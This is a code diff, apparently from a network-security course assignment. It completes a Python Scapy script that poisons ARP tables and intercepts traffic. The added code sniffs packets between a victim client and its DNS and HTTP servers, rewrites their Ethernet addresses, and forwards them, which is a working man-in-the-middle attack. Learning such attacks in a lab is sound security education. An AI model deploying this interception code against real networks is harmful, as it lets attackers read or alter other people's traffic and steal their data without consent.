@@ -42,7 +42,7 @@ def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, 
 
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(srcIP, srcMAC, dstIP, dstMAC):
-    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
+    # debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
     gratuitous_arp = ARP(op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC)
     send(gratuitous_arp)
 
@@ -53,11 +53,30 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
     spoof(srcIP, srcMAC, dstIP, dstMAC)
 
 
+def handle_packet(p):
+    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
+    try:
+        if p[Ether].src == attackerMAC: # Ignore our own spoofing packages
+            return;
+        debug(f'Sniffed: {p.summary()}')
+        p[Ether].src=attackerMAC
+        if p[IP].dst == httpServerIP: p[Ether].dst = httpServerMAC
+        if p[IP].dst == dnsServerIP: p[Ether].dst = dnsServerMAC
+        if p[IP].dst == clientIP: p[Ether].dst = clientMAC
+        sendp(p, iface=conf.iface)
+    except Exception as e:
+        debug(f'Error when sniffing: {e}')
+    pass
+
 # TODO: handle intercepted packets
 # NOTE: this intercepts all packets that are sent AND received by the attacker, so 
 # you will want to filter out packets that you do not intend to intercept and forward
 def interceptor(packet):
     global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
+    bpf = (f"(dst host {clientIP}) or ((src host {clientIP} and ((dst host {dnsServerIP}) or (dst host {httpServerIP}))))")
+    debug(f'Sniffer use BPF: {bpf}')
+    sniff(store=0, filter=bpf, prn=handle_packet,
+            stop_filter=lambda x: False, iface=conf.iface)
 
 
 if __name__ == "__main__":
